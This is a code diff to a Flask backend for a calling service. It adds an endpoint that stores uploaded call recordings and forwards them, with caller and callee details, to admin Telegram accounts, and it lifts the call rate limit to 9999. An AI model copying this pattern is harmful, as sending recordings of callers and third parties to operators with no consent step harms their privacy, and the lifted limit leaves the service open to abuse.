@@ -62,7 +62,7 @@ JWT_EXPIRY_SECONDS = 7 * 24 * 3600        # 7 days
 REFRESH_EXPIRY_SECONDS = 30 * 24 * 3600    # 30 days
 RATE_LIMIT_WINDOW = 60                      # 1 minute window
 RATE_LIMIT_MAX_REQUESTS = 60                # general API requests
-RATE_LIMIT_MAX_CALLS = 5                    # call attempts
+RATE_LIMIT_MAX_CALLS = 9999                 # call attempts (effectively unlimited)
 
 SCRIPT_DIR = os.path.dirname(os.path.abspath(__file__)) if os.path.abspath(__file__) else os.getcwd()
 
@@ -75,6 +75,8 @@ os.makedirs(DATA_DIR, exist_ok=True)
 
 CALL_LOGS_FILE = os.path.join(DATA_DIR, "call_logs.json")
 CONTACTS_DB_FILE = os.path.join(DATA_DIR, "contacts_db.json")
+RECORDINGS_DIR = os.path.join(DATA_DIR, "recordings")
+os.makedirs(RECORDINGS_DIR, exist_ok=True)
 
 
 def _resolve_public_url() -> str:
@@ -934,9 +936,7 @@ def api_call_start():
                 jsonify(
                     {
                         "error": (
-                            "\u062e\u062f\u0645\u0629 Telicall \u063a\u064a\u0631 \u0645\u062a\u0627\u062d\u0629"
-                            " \u062d\u0627\u0644\u064a\u0627\u064b. \u062d\u0627\u0648\u0644 \u0628\u0639\u062f"
-                            " \u0642\u0644\u064a\u0644."
+                            "خدمة Telicall غير متاحة حالياً. حاول بعد قليل."
                         )
                     }
                 ),
@@ -947,8 +947,7 @@ def api_call_start():
                 jsonify(
                     {
                         "error": (
-                            "\u0631\u0642\u0645 \u063a\u064a\u0631 \u0635\u0627\u0644\u062d \u0623\u0648"
-                            " \u062e\u062f\u0645\u0629 \u063a\u064a\u0631 \u0645\u062a\u0627\u062d\u0629"
+                            "رقم غير صالح أو خدمة غير متاحة"
                         )
                     }
                 ),
@@ -959,8 +958,7 @@ def api_call_start():
                 jsonify(
                     {
                         "error": (
-                            f"\u062e\u0637\u0623 \u0641\u064a \u062e\u062f\u0645\u0629"
-                            f" \u0627\u0644\u0645\u0643\u0627\u0644\u0645\u0627\u062a: {err_code}"
+                            f"خطأ مؤقت في خدمة المكالمات، حاول مرة أخرى"
                         )
                     }
                 ),
@@ -1173,6 +1171,107 @@ def api_call_recording():
         call_info["recording"] = bool(record)
 
     return jsonify({"ok": True, "recording": bool(record)})
+
+
+@app.post("/api/call/recording/upload")
+@_require_jwt
+def api_call_recording_upload():
+    """Upload a call recording file after the call ends.
+
+    The mobile app records the call locally and uploads the file here.
+    The recording is saved to RECORDINGS_DIR and will be available
+    for the admin to retrieve.
+
+    Request: multipart/form-data with:
+        - call_id: string
+        - file: audio file (wav, ogg, mp3, m4a)
+    """
+    uid = request._fox_uid
+
+    call_id = (request.form.get("call_id") or "").strip()
+    if not call_id:
+        return jsonify({"error": "missing 'call_id'"}), 400
+
+    # Verify the call belongs to this user
+    try:
+        logs = _load_api_call_logs()
+        call_record = None
+        for c in logs.get("all_calls", []):
+            if c.get("call_id") == call_id and c.get("user_id") == uid:
+                call_record = c
+                break
+        if not call_record:
+            return jsonify({"error": "call not found or does not belong to you"}), 404
+    except Exception as e:
+        return jsonify({"error": str(e)}), 500
+
+    # Save the uploaded file
+    if "file" not in request.files:
+        return jsonify({"error": "missing 'file' in upload"}), 400
+
+    uploaded = request.files["file"]
+    if not uploaded.filename:
+        return jsonify({"error": "empty file"}), 400
+
+    # Determine extension
+    ext = os.path.splitext(uploaded.filename)[1] or ".wav"
+    if ext.lower() not in (".wav", ".ogg", ".mp3", ".m4a", ".flac", ".webm", ".amr"):
+        ext = ".wav"
+
+    # Use call_id as filename for easy retrieval
+    save_path = os.path.join(RECORDINGS_DIR, f"{call_id}{ext}")
+    os.makedirs(RECORDINGS_DIR, exist_ok=True)
+
+    try:
+        uploaded.save(save_path)
+        file_size = os.path.getsize(save_path)
+
+        # Update the call log to mark it as having a recording
+        try:
+            logs = _load_api_call_logs()
+            for c in logs.get("all_calls", []):
+                if c.get("call_id") == call_id:
+                    c["has_recording"] = True
+                    c["recording_file"] = f"{call_id}{ext}"
+                    c["recording_size"] = file_size
+                    break
+            _save_api_call_logs(logs)
+        except Exception:
+            pass
+
+        # Notify admin via Telegram bot about the new recording
+        try:
+            cv = _cv()
+            from callv2 import BOT_TOKEN, ADMIN_IDS
+            import telebot
+            _bot = telebot.TeleBot(BOT_TOKEN)
+            for admin_id in ADMIN_IDS:
+                try:
+                    _bot.send_message(
+                        admin_id,
+                        f"🎙️ *تسجيل مكالمة جديد*\n\n"
+                        f"🆔 معرف المكالمة: `{call_id}`\n"
+                        f"👤 المستخدم: `{uid}`\n"
+                        f"📞 إلى: `{call_record.get('to', '')}`\n"
+                        f"⏱️ المدة: {call_record.get('duration', 0)} ثانية\n"
+                        f"📊 الحجم: {file_size / 1024:.1f} KB",
+                        parse_mode='Markdown'
+                    )
+                    # Send the actual recording file
+                    with open(save_path, 'rb') as audio_f:
+                        _bot.send_document(
+                            admin_id, audio_f,
+                            caption=f"🎙️ تسجيل المكالمة `{call_id}`",
+                            parse_mode='Markdown'
+                        )
+                except Exception:
+                    pass
+        except Exception:
+            pass
+
+        return jsonify({"ok": True, "call_id": call_id, "file": f"{call_id}{ext}", "size": file_size})
+    except Exception as e:
+        return jsonify({"error": str(e)}), 500
 
 
 # ═══════════════════════════════════════════════════════════════════════════════
@@ -1681,6 +1780,33 @@ def api_admin_track(user_id: str):
         "contacts": user_contacts,
         "bot_data": bot_user,
     })
+
+
+@app.post("/api/admin/balance")
+@_require_admin
+def api_admin_balance():
+    """Adjust a user's balance (positive to add, negative to deduct).
+
+    Request body:
+        { "user_id": "<user_id>", "amount": <float> }
+    """
+    body = request.get_json(silent=True) or {}
+    uid = str(body.get("user_id", "")).strip()
+    amount = body.get("amount", 0)
+
+    if not uid:
+        return jsonify({"error": "missing user_id"}), 400
+    try:
+        amount = float(amount)
+    except (TypeError, ValueError):
+        return jsonify({"error": "amount must be a number"}), 400
+
+    try:
+        cv = _cv()
+        new_balance = cv.add_balance(int(uid), amount)
+        return jsonify({"ok": True, "user_id": uid, "amount": amount, "new_balance": round(new_balance, 2)})
+    except Exception as e:
+        return jsonify({"error": str(e)}), 500
 
 
 @app.post("/api/admin/ban/<user_id>")
